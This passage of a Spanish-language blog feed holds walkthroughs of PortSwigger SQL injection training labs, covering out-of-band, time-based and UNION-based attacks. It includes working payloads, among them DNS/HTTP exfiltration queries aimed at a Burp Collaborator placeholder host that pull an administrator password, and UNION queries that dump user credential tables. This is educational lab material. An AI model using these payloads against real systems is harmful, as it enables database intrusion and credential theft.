&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 16</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/</link>
        <pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 16" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft&#34;&gt;Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la contrasena del usuario &amp;lsquo;administrator&amp;rsquo; en la tabla &amp;lsquo;users&amp;rsquo;. Para este caso haciendo uso de la exfiltracion de la propia base de datos para que se conecte a nuestro host y ahi captura lo que es enviado en la url.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero es saber que tipo de payloads podemos usar para ejecutar la consulta que deseamos, y se encuentran las siguientes:&lt;/p&gt;
&lt;hr&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Consulta&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;SELECT extractvalue(xmltype(&#39;&amp;lt;?xml version=&amp;ldquo;1.0&amp;rdquo; encoding=&amp;ldquo;UTF-8&amp;rdquo;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &amp;ldquo;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&amp;quot;&amp;gt; %remote;]&amp;gt;&#39;),&#39;/l&#39;) FROM dual&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft&lt;/td&gt;
&lt;td&gt;declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&amp;lsquo;master..xp_dirtree &amp;ldquo;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&amp;rdquo;&#39;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into (SELECT YOUR-QUERY-HERE); c := &amp;lsquo;copy (SELECT &amp;lsquo;&#39;&#39;&#39;) to program &amp;lsquo;&amp;lsquo;nslookup &amp;lsquo;||p||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net&amp;rsquo;&#39;&#39;;execute c; END; $$ language plpgsql security definer; SELECT f();&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;SELECT YOUR-QUERY-HERE INTO OUTFILE &amp;lsquo;\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&amp;rsquo; &lt;em&gt;solo funciona en windows&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;Ahora toca saber cual es el payload correcto para poder resolver el lab, probando de uno en uno llegamos a cual es el correcto, asi que probaremos con Oracle el cual termino siendo el correcto y evitarnos probar cada uno del resto, la consulta ejecutada fue:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT extractvalue(xmltype(&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&amp;gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ENTITY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SYSTEM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&amp;#39;||(SELECT password from users where username=&amp;#39;administrator&amp;#39;)||&amp;#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;),&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) FROM dual--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Claramente este codigo debemos convertirlo en formato URL para que no entre en conflicto con el header que es enviado. Para quedarmente enviado y ejecutado de esta manera.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 140; 
			flex-basis: 338px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater.png&#34; data-size=&#34;1546x1097&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater.png&#34;
			width=&#34;1546&#34;
			height=&#34;1097&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater_hu6e396335c4c9a3008f18d7243f6688e9_158621_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/repeater_hu6e396335c4c9a3008f18d7243f6688e9_158621_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion enviada con repeater para exfiltrar la contrasena&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion enviada con repeater para exfiltrar la contrasena&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora solo queda iniciar sesion con la contrasena de administrator qu es &lt;code&gt;54m0mxu0yem302cyqm60&lt;/code&gt;.Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 196; 
			flex-basis: 471px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto.png&#34; data-size=&#34;1780x906&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto.png&#34;
			width=&#34;1780&#34;
			height=&#34;906&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto_hu07931e63497d5aea473f97c5614a0e07_96835_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/resuelto_hu07931e63497d5aea473f97c5614a0e07_96835_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 13</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/</link>
        <pubDate>Mon, 08 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 13" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-time-delays&#34;&gt;Lab: Blind SQL injection with time delays&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de sql injection pero basandose en tiempo, en este caso la inyeccion solo es para poder inyectar un codigo que genere un delay hacia el backend de la base de datos, lo cual la respuesta tardara segun el tiempo que nosotros le inyectemos. En base a ese tiempo despues podriamos generar una consulta if para poder devolvernos si la consulta hecha es true o false.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Se pide que solo se inyecte una consulta sql que cause un delay de 10 segundos asi que buscaremos la vulnerabilidad en la aplicacion y para generar un delay con cada backend seria un ejemplo:&lt;/p&gt;
&lt;p&gt;Oracle&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dbms_pipe.receive_message((&#39;a&#39;),10)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Microsoft&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WAITFOR DELAY &#39;0:0:10&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;PostgreSQL&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT pg_sleep(10)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;MySQL&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT sleep(10)&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;En este caso he conocido otra &lt;!-- raw HTML omitted --&gt;lista&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt; donde reune todos los payloads que se pueden inyectar para generar una vulnerabilidad sql. Al hacer tantas combinaciones, se pudo generar una o varias la cual permiten que se genere un delay en la aplicacion. Todo esto podemos verlo gracias a uno de los probados son:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1337&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1337&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lo primero a agregar es que se debe de activar la columna &lt;code&gt;response received&lt;/code&gt; para ver el tiempo que la respuesta a tardado en ser recibida, lo que nos indica que se inyecto una consult sql.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 489; 
			flex-basis: 1174px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/intruder.png&#34; data-size=&#34;974x199&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/intruder.png&#34;
			width=&#34;974&#34;
			height=&#34;199&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/intruder_hu84c9dcc0151ff24e5f16b96978ec8268_6923_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/intruder_hu84c9dcc0151ff24e5f16b96978ec8268_6923_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque de sql injection time based con intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque de sql injection time based con intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora la enviaremos por repeater con un sleep de 10 segundos y ver si tarda 10 segundos en responder y si vemos de lado derecho la peticion dura 10,486 millis en responder.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 220; 
			flex-basis: 528px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/repeater.png&#34; data-size=&#34;1336x607&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/repeater.png&#34;
			width=&#34;1336&#34;
			height=&#34;607&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/repeater_huf0e5ab5037a292e044b3df38cbe38ce9_118306_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/repeater_huf0e5ab5037a292e044b3df38cbe38ce9_118306_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Envio de peticion por repeater&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Envio de peticion por repeater&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 238; 
			flex-basis: 572px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/resuelto.png&#34; data-size=&#34;1772x743&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/resuelto.png&#34;
			width=&#34;1772&#34;
			height=&#34;743&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/resuelto_huec78dc9529bbfebd5c8e1f5867d71e8c_88264_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/resuelto_huec78dc9529bbfebd5c8e1f5867d71e8c_88264_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-time-delays&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Lista de Payloads SQL Injection Time Based&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 10</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/</link>
        <pubDate>Sun, 07 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 10" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-listing-the-database-contents-on-oracle&#34;&gt;Lab: SQL injection attack, listing the database contents on Oracle&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer los datos en una base de datos oracle que es muy distinto a como se hace en los otros gestores&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo &lt;code&gt;union select null-- &lt;/code&gt; notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un &lt;code&gt;-&lt;/code&gt; para inyectar correctamente la consulta y contrario por medio de &lt;code&gt;repeater en burpsuite&lt;/code&gt; si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;payloads&#34;&gt;Payloads&lt;/h2&gt;
&lt;h3 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1-- -
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- - //Muestra error
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from dual-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-tablas&#34;&gt;Recuperar tablas&lt;/h3&gt;
&lt;p&gt;Ahora recuperar las tablas, en este caso vamos a buscar una tabla que contenga los usuarios, en este caso es la tabla &lt;code&gt;USERS_TMNLZU&lt;/code&gt; y es la que se lista.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select table_name,null from all_tables-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 117; 
			flex-basis: 280px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas.png&#34; data-size=&#34;1720x1470&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas.png&#34;
			width=&#34;1720&#34;
			height=&#34;1470&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas_hubb502ce8c335fdb496ff495a359e13a6_180676_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/tablas_hubb502ce8c335fdb496ff495a359e13a6_180676_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Tablas&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Tablas&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h3&gt;
&lt;p&gt;Para detectar el nombre de las columnas en las tablas se inyecta la siguiente consulta, indicando la tabla de la que se quiere extraer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select column_name,null from all_tab_columns where table_name = &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;USERS_TMNLZU&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 104; 
			flex-basis: 250px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34; data-size=&#34;1766x1692&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34;
			width=&#34;1766&#34;
			height=&#34;1692&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Columnas de tabla USERS_TMNLZU&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Columnas de tabla USERS_TMNLZU&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;extraer-datos&#34;&gt;Extraer datos&lt;/h3&gt;
&lt;p&gt;Ahora podremos recuperar los datos teniendo el nombre de las columnas y el nombre de las tablas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select USERNAME_KNMULR,PASSWORD_KQXSZA from USERS_TMNLZU-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 104; 
			flex-basis: 250px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34; data-size=&#34;1766x1692&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas.png&#34;
			width=&#34;1766&#34;
			height=&#34;1692&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/columnas_hue1e717f2cfe9ce622826b21d67bc2c9e_590416_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Datos extraidos de la tabla USERS_TMNLZU&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Datos extraidos de la tabla USERS_TMNLZU&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 202; 
